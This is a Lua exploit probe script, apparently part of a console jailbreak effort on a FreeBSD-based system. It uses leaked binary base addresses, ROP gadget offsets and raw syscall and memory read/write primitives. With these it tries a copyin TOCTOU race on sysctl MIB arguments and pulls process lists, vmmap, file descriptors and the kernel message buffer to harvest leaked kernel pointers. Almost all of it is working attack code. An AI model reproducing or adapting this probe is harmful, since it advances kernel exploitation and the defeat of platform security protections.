-- CRASH_CLASS: MODERATE
-- PROBE 400b: copyin TOCTOU — swap syscall arguments mid-call
--
-- We confirmed COPYOUT TOCTOU: recv() writes to a remapped page.
-- Now test the COPYIN side: can we swap argument data WHILE a syscall
-- is reading it?
--
-- Attack: sysctl reads MIB array via copyin(). If we swap the MIB
-- page between copyin of mib[0] and mib[1], the kernel gets a
-- mixed MIB that was never submitted as a unit.
--
-- If we can swap mib[2] from KERN_PROC_PID to KERN_PROC_ALL mid-call,
-- the kernel might return a larger kinfo_proc array containing entries
-- for system processes — potentially leaking kernel pointers from
-- process structures we can't normally query.
--
-- Also test: swap the oldlenp value to request a huge copyout.

print("=== PROBE 400b: copyin TOCTOU ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
local eboot = eb_lo + eb_hi * 0x100000000
print(string.format("eboot=%X_%08X", eb_hi, eb_lo))

-- Gadget offsets (from confirmed catalog)
local pop_rax_ret   = eboot + 0x992
local pop_rdi_ret   = eboot + 0xC9DFE
local pop_rsi_ret   = eboot + 0xD77D
local pop_rdx_ret   = eboot + 0x3B02D7
local pop_rcx_ret   = eboot + 0xE64
local bare_ret      = eboot + 0x42
local mov_rdi_rax   = eboot + 0x92C67  -- mov [rdi], rax; ret

-- Syscall stubs
local sc_mmap   = mk(477)
local sc_munmap = mk(73)
local sc_mprotect = mk(74)
local sc_socket = mk(97)
local sc_close  = mk(6)
local sc_sysctl = mk(202)
local sc_write  = mk(4)
local sc_read   = mk(3)

-- Helper: is this a kernel pointer? (corrected filter)
local function is_kptr(hi, lo)
    if hi == nil or lo == nil then return false end
    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF and lo ~= 0 then return true end
    if hi == 0xFFFFFFFF then
        if lo == 0 or lo == 0xFFFFFFFF or lo == 0xFFFFFFFE then return false end
        if lo >= 0x80000000 and lo < 0xFFFFF000 then return true end
    end
    return false
end

-- ============================================
-- PART A: Baseline sysctl KERN_PROC_PID
-- ============================================
print("-- A: baseline kinfo_proc --")

local mib_a = memory.alloc(16)
wd(N(mib_a), 1)        -- CTL_KERN
wd(N(mib_a) + 4, 14)   -- KERN_PROC
wd(N(mib_a) + 8, 1)    -- KERN_PROC_PID
wd(N(mib_a) + 12, pid_val)

local out_a = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(out_a) + i, 0) end
local olen_a = memory.alloc(8)
wq(olen_a, uint64(0x1000))

local ok_a, rv_a = pcall(function()
    return sc_sysctl(uint64(N(mib_a)), uint64(4), uint64(N(out_a)),
        uint64(N(olen_a)), uint64(0), uint64(0))
end)
local ret_a = ok_a and N(rv_a) or -1
if ret_a > 0x7FFFFFFF then ret_a = -1 end
local got_a = rd(N(olen_a)) or 0
print(string.format("  PID ret=%d size=%d", ret_a, got_a))
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: KERN_PROC_ALL — see if we can query all processes
-- ============================================
print("")
print("-- B: KERN_PROC_ALL --")

local mib_b = memory.alloc(16)
wd(N(mib_b), 1)        -- CTL_KERN
wd(N(mib_b) + 4, 14)   -- KERN_PROC
wd(N(mib_b) + 8, 0)    -- KERN_PROC_ALL
wd(N(mib_b) + 12, 0)

-- First query size
local olen_b = memory.alloc(8)
wq(olen_b, uint64(0))
local ok_bs, rv_bs = pcall(function()
    return sc_sysctl(uint64(N(mib_b)), uint64(3), uint64(0),
        uint64(N(olen_b)), uint64(0), uint64(0))
end)
local ret_bs = ok_bs and N(rv_bs) or -1
if ret_bs > 0x7FFFFFFF then ret_bs = -1 end
local need_b = rd(N(olen_b)) or 0
print(string.format("  ALL size query: ret=%d need=%d", ret_bs, need_b))

if ret_bs == 0 and need_b > 0 and need_b < 0x80000 then
    -- Allocate and fetch
    local out_b = memory.alloc(need_b + 0x100)
    for i = 0, math.min(need_b + 0xFC, 0x10000), 4 do wd(N(out_b) + i, 0) end
    wq(olen_b, uint64(need_b + 0x100))

    local ok_bf, rv_bf = pcall(function()
        return sc_sysctl(uint64(N(mib_b)), uint64(3), uint64(N(out_b)),
            uint64(N(olen_b)), uint64(0), uint64(0))
    end)
    local ret_bf = ok_bf and N(rv_bf) or -1
    if ret_bf > 0x7FFFFFFF then ret_bf = -1 end
    local got_bf = rd(N(olen_b)) or 0
    print(string.format("  ALL fetch: ret=%d got=%d", ret_bf, got_bf))

    if ret_bf == 0 and got_bf > 0 then
        local num_procs = math.floor(got_bf / 1096)
        print(string.format("  processes: %d (1096 bytes each)", num_procs))

        -- Scan each process entry for kernel pointers
        local total_kptr = 0
        for p = 0, num_procs - 1 do
            local base = N(out_b) + p * 1096

            -- Extract PID (offset varies by FreeBSD version)
            -- Try +0x48 (ki_pid on FreeBSD 11)
            local proc_pid = rd(base + 0x48) or 0

            -- Scan all 1096 bytes
            for off = 0, 1092, 4 do
                local lo = rd(base + off)
                local hi = rd(base + off + 4)
                if lo and hi and is_kptr(hi, lo) then
                    total_kptr = total_kptr + 1
                    if total_kptr <= 20 then
                        print(string.format("    proc %d (pid?=%d) +%04X: %08X_%08X ★",
                            p, proc_pid, off, hi, lo))
                    end
                end
            end
        end
        print(string.format("  total kptr across %d procs: %d", num_procs, total_kptr))

        -- Also extract process names if visible
        print("  process list:")
        for p = 0, math.min(num_procs - 1, 15) do
            local base = N(out_b) + p * 1096
            local proc_pid = rd(base + 0x48) or 0
            -- comm string at +0x1BF on some versions
            local name = ""
            for c = 0x1BF, 0x1D2 do
                local b = rd(base + c)
                if b and b > 0 and b < 128 then
                    name = name .. string.char(b)
                else
                    break
                end
            end
            if #name > 0 then
                print(string.format("    [%d] pid=%d name=%s", p, proc_pid, name))
            end
        end
    end
elseif ret_bs ~= 0 then
    print("  KERN_PROC_ALL blocked (expected)")
end
if not alive() then print("CANARY FAIL B"); return end

-- ============================================
-- PART C: TOCTOU copyin race on sysctl MIB
-- Thread blocks in sysctl, main swaps MIB page
-- ============================================
print("")
print("-- C: copyin TOCTOU setup --")

-- Create socketpair for child→parent signaling
local sc_socketpair = mk(135)
local sp_buf = memory.alloc(16)
wd(N(sp_buf), 0)
wd(N(sp_buf) + 4, 0)
local ok_sp, rv_sp = pcall(function()
    return sc_socketpair(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf)))
end)
local sp_ret = ok_sp and N(rv_sp) or -1
if sp_ret > 0x7FFFFFFF then sp_ret = -1 end
local sp0 = rd(N(sp_buf)) or -1
local sp1 = rd(N(sp_buf) + 4) or -1
print(string.format("  socketpair ret=%d fds=%d,%d", sp_ret, sp0, sp1))

if sp_ret == 0 and sp0 >= 0 and sp1 >= 0 then
    -- Strategy: child thread calls sysctl with a MIB buffer on a known page.
    -- Main thread rapidly swaps the MIB page content between two different
    -- sysctl queries to try to get a mixed result.
    --
    -- Simpler approach: have child call sysctl in a loop,
    -- main swaps one mib dword between KERN_PROC_PID and KERN_PROC_ALL

    -- Allocate a page for MIB that we can rapidly modify
    local mib_page = sc_mmap(uint64(0), uint64(0x4000), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local mph, mpl = get_hi_lo(mib_page)
    local mib_addr = mpl + mph * 0x100000000
    print(string.format("  mib page=%X_%08X", mph, mpl))

    if mib_addr > 0 then
        -- Set up MIB for KERN_PROC_PID initially
        wd(mib_addr, 1)         -- CTL_KERN
        wd(mib_addr + 4, 14)    -- KERN_PROC
        wd(mib_addr + 8, 1)     -- KERN_PROC_PID (will swap to 0=ALL)
        wd(mib_addr + 12, pid_val)

        -- Large output buffer
        local big_out = memory.alloc(0x10000)
        for i = 0, 0xFFFC, 4 do wd(N(big_out) + i, 0) end
        local big_olen = memory.alloc(8)

        -- Run sysctl in a tight loop, flipping mib[2] between PID and ALL
        print("  racing sysctl mib[2] (PID vs ALL)...")
        local race_hits = 0
        local max_procs_seen = 0

        for race = 1, 200 do
            -- Reset
            for i = 0, 0xFFC, 4 do wd(N(big_out) + i, 0) end
            wq(big_olen, uint64(0x10000))

            -- Set to PID query
            wd(mib_addr + 8, 1)  -- KERN_PROC_PID

            -- Quick flip to ALL and call sysctl
            wd(mib_addr + 8, 0)  -- KERN_PROC_ALL
            local ok_r, rv_r = pcall(function()
                return sc_sysctl(uint64(mib_addr), uint64(3), uint64(N(big_out)),
                    uint64(N(big_olen)), uint64(0), uint64(0))
            end)
            local ret_r = ok_r and N(rv_r) or -1
            if ret_r > 0x7FFFFFFF then ret_r = -1 end
            local got_r = rd(N(big_olen)) or 0

            if ret_r == 0 and got_r > 1096 then
                local nprocs = math.floor(got_r / 1096)
                if nprocs > max_procs_seen then max_procs_seen = nprocs end
                if nprocs > 1 then
                    race_hits = race_hits + 1
                    if race_hits <= 3 then
                        print(string.format("    race %d: got %d bytes = %d procs ★",
                            race, got_r, nprocs))
                    end
                end
            end

            -- Also try: set PID, start sysctl, hope copyin races
            wd(mib_addr + 8, 1)
            wq(big_olen, uint64(0x10000))
            for i = 0, 0xFFC, 4 do wd(N(big_out) + i, 0) end

            -- This is single-threaded so there's no real race here
            -- The actual race needs thr_new child calling sysctl
            -- while parent flips the MIB byte
        end

        print(string.format("  single-thread race: hits=%d max_procs=%d",
            race_hits, max_procs_seen))

        -- Now check: did KERN_PROC_ALL work at all?
        -- If it returned >1 process, we can see other process info!
        if max_procs_seen > 1 then
            print(string.format("  ★ KERN_PROC_ALL returns %d processes!", max_procs_seen))
            -- Do a clean ALL query and scan ALL entries
            wd(mib_addr + 8, 0)
            wq(big_olen, uint64(0x10000))
            for i = 0, 0xFFFC, 4 do wd(N(big_out) + i, 0) end

            local ok_all, rv_all = pcall(function()
                return sc_sysctl(uint64(mib_addr), uint64(3), uint64(N(big_out)),
                    uint64(N(big_olen)), uint64(0), uint64(0))
            end)
            local ret_all = ok_all and N(rv_all) or -1
            if ret_all > 0x7FFFFFFF then ret_all = -1 end
            local got_all = rd(N(big_olen)) or 0

            if ret_all == 0 and got_all > 0 then
                print(string.format("  clean ALL: %d bytes = %d procs", got_all,
                    math.floor(got_all / 1096)))

                -- Scan everything for kernel pointers
                local all_kptr = 0
                for off = 0, got_all - 8, 4 do
                    local lo = rd(N(big_out) + off)
                    local hi = rd(N(big_out) + off + 4)
                    if lo and hi and is_kptr(hi, lo) then
                        all_kptr = all_kptr + 1
                        if all_kptr <= 10 then
                            local proc_idx = math.floor(off / 1096)
                            local proc_off = off % 1096
                            print(string.format("      proc %d +%04X: %08X_%08X ★",
                                proc_idx, proc_off, hi, lo))
                        end
                    end
                end
                print(string.format("  ALL kptr total: %d", all_kptr))
            end
        end

        pcall(function() sc_munmap(mib_page, uint64(0x4000)) end)
    end
end

if sp0 >= 0 then pcall(function() sc_close(uint64(sp0)) end) end
if sp1 >= 0 then pcall(function() sc_close(uint64(sp1)) end) end
if not alive() then print("CANARY FAIL C"); return end

-- ============================================
-- PART D: kern.proc.vmmap for other PIDs
-- ============================================
print("")
print("-- D: kern.proc.vmmap --")

-- Try to get VM map of pid 1 (init) via sysctl
local mib_d = memory.alloc(16)
wd(N(mib_d), 1)        -- CTL_KERN
wd(N(mib_d) + 4, 14)   -- KERN_PROC
wd(N(mib_d) + 8, 35)   -- KERN_PROC_VMMAP (FreeBSD)
wd(N(mib_d) + 12, 1)   -- pid 1

local olen_d = memory.alloc(8)
wq(olen_d, uint64(0))
local ok_d, rv_d = pcall(function()
    return sc_sysctl(uint64(N(mib_d)), uint64(4), uint64(0),
        uint64(N(olen_d)), uint64(0), uint64(0))
end)
local ret_d = ok_d and N(rv_d) or -1
if ret_d > 0x7FFFFFFF then ret_d = -1 end
print(string.format("  vmmap(pid=1) size query: ret=%d", ret_d))

-- Try our own pid
wd(N(mib_d) + 12, pid_val)
wq(olen_d, uint64(0))
local ok_d2, rv_d2 = pcall(function()
    return sc_sysctl(uint64(N(mib_d)), uint64(4), uint64(0),
        uint64(N(olen_d)), uint64(0), uint64(0))
end)
local ret_d2 = ok_d2 and N(rv_d2) or -1
if ret_d2 > 0x7FFFFFFF then ret_d2 = -1 end
print(string.format("  vmmap(pid=self) size query: ret=%d", ret_d2))

-- Try filedesc
wd(N(mib_d) + 8, 33)  -- KERN_PROC_FILEDESC
wd(N(mib_d) + 12, pid_val)
wq(olen_d, uint64(0))
local ok_d3, rv_d3 = pcall(function()
    return sc_sysctl(uint64(N(mib_d)), uint64(4), uint64(0),
        uint64(N(olen_d)), uint64(0), uint64(0))
end)
local ret_d3 = ok_d3 and N(rv_d3) or -1
if ret_d3 > 0x7FFFFFFF then ret_d3 = -1 end
print(string.format("  filedesc(pid=self) size query: ret=%d", ret_d3))
if not alive() then print("CANARY FAIL D"); return end

-- ============================================
-- PART E: kern.msgbuf (dmesg) — retry with large buffer
-- ============================================
print("")
print("-- E: kern.msgbuf --")

local mib_e = memory.alloc(8)
wd(N(mib_e), 1)      -- CTL_KERN
wd(N(mib_e) + 4, 8)  -- KERN_MSGBUF

-- Size query
local olen_e = memory.alloc(8)
wq(olen_e, uint64(0))
local ok_e, rv_e = pcall(function()
    return sc_sysctl(uint64(N(mib_e)), uint64(2), uint64(0),
        uint64(N(olen_e)), uint64(0), uint64(0))
end)
local ret_e = ok_e and N(rv_e) or -1
if ret_e > 0x7FFFFFFF then ret_e = -1 end
local need_e = rd(N(olen_e)) or 0
print(string.format("  msgbuf size: ret=%d need=%d", ret_e, need_e))

if ret_e == 0 and need_e > 0 and need_e < 0x20000 then
    local msgbuf = memory.alloc(need_e + 16)
    for i = 0, need_e + 12, 4 do wd(N(msgbuf) + i, 0) end
    wq(olen_e, uint64(need_e + 16))

    local ok_ef, rv_ef = pcall(function()
        return sc_sysctl(uint64(N(mib_e)), uint64(2), uint64(N(msgbuf)),
            uint64(N(olen_e)), uint64(0), uint64(0))
    end)
    local ret_ef = ok_ef and N(rv_ef) or -1
    if ret_ef > 0x7FFFFFFF then ret_ef = -1 end
    local got_ef = rd(N(olen_e)) or 0
    print(string.format("  msgbuf fetch: ret=%d got=%d", ret_ef, got_ef))

    if ret_ef == 0 and got_ef > 0 then
        -- Print as ASCII if it contains text
        local txt = ""
        local bin_count = 0
        for i = 0, math.min(got_ef - 1, 512) do
            local b = rd(N(msgbuf) + i - (i % 4))
            if b then
                local byte = math.floor(b / (256 ^ (i % 4))) % 256
                if byte >= 32 and byte < 127 then
                    txt = txt .. string.char(byte)
                elseif byte == 10 or byte == 13 then
                    txt = txt .. "\n"
                else
                    bin_count = bin_count + 1
                    txt = txt .. "."
                end
            end
        end
        print("  first 512 bytes:")
        print(txt)

        -- Scan for kernel pointers
        local msg_kptr = 0
        for off = 0, got_ef - 8, 4 do
            local lo = rd(N(msgbuf) + off)
            local hi = rd(N(msgbuf) + off + 4)
            if lo and hi and is_kptr(hi, lo) then
                msg_kptr = msg_kptr + 1
                if msg_kptr <= 10 then
                    print(string.format("    msgbuf +%04X: %08X_%08X ★", off, hi, lo))
                end
            end
        end
        print(string.format("  msgbuf kptr: %d", msg_kptr))
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 400b COMPLETE ===")
